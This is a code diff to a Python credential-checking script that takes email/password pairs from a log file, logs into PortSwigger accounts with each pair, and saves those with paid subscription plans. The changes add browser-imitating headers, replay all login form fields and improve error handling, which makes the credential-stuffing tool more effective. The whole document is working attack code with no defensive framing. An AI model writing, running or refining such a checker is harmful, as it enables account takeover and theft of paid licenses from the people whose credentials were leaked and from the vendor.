@@ -9,6 +9,7 @@ import requests
 import re
 import sys
 from datetime import datetime
+from urllib.parse import urlencode
 
 INPUT_FILE = "log.txt"
 OUTPUT_FILE = "portswigger_paid_accounts.txt"
@@ -22,7 +23,12 @@ class PortSwiggerChecker:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
         })
         self.session.timeout = 30
 
@@ -30,6 +36,14 @@ class PortSwiggerChecker:
         """Extract state parameter from login form"""
         match = re.search(r'name="state" value="([^"]+)"', html)
         return match.group(1) if match else None
+
+    def extract_all_form_fields(self, html):
+        """Extract all form fields from login form"""
+        fields = {}
+        pattern = r'<input[^>]+name="([^"]+)"[^>]+value="([^"]*)"'
+        for match in re.finditer(pattern, html):
+            fields[match.group(1)] = match.group(2)
+        return fields
 
     def extract_plan(self, html):
         """Extract subscription plan from licenses page"""
@@ -53,25 +67,29 @@ class PortSwiggerChecker:
     def check_login_and_plan(self, email, password):
         """Check if credentials are valid and extract plan"""
         try:
-            # Get login page
+            # Get login page to extract all form fields
             resp1 = self.session.get(LOGIN_URL, timeout=30)
             if resp1.status_code != 200:
-                return None, "login_page_error"
+                return None, f"login_page_error: {resp1.status_code}"
 
-            # Extract state
-            state = self.extract_state(resp1.text)
-            if not state:
-                return None, "no_state"
+            # Extract all form fields
+            form_fields = self.extract_all_form_fields(resp1.text)
+            if not form_fields:
+                return None, "no_form_fields"
 
-            # POST credentials
-            post_data = {
-                'state': state,
-                'username': email,
-                'password': password,
-                'action': 'default'
-            }
+            # Update with our credentials
+            form_fields['username'] = email
+            form_fields['password'] = password
 
-            resp2 = self.session.post(LOGIN_POST_URL, data=post_data, timeout=30, allow_redirects=True)
+            # POST credentials with all form fields
+            resp2 = self.session.post(LOGIN_POST_URL, data=form_fields, timeout=30, allow_redirects=True)
+
+            # Check response status
+            if resp2.status_code == 400:
+                # Extract error message if available
+                error_match = re.search(r'error["\']?\s*[:=]\s*["\']?([^"\'<]+)', resp2.text, re.IGNORECASE)
+                error_msg = error_match.group(1) if error_match else "http_400"
+                return None, f"post_error: {error_msg}"
 
             # Check if login failed
             if "Wrong email or password" in resp2.text or "Invalid email or password" in resp2.text:
@@ -81,13 +99,13 @@ class PortSwiggerChecker:
             if "name=\"state\"" in resp2.text and LOGIN_POST_URL in resp2.url:
                 return None, "login_failed"
 
-            # Try to access licenses page to confirm auth and get plan
+            # Try to access licenses page to confirm auth
             resp3 = self.session.get(LICENSES_URL, timeout=30)
             if resp3.status_code == 200:
                 plan = self.extract_plan(resp3.text)
                 return plan, "checked"
             else:
-                return None, "access_denied"
+                return None, f"access_denied: {resp3.status_code}"
 
         except requests.exceptions.Timeout:
             return None, "timeout"
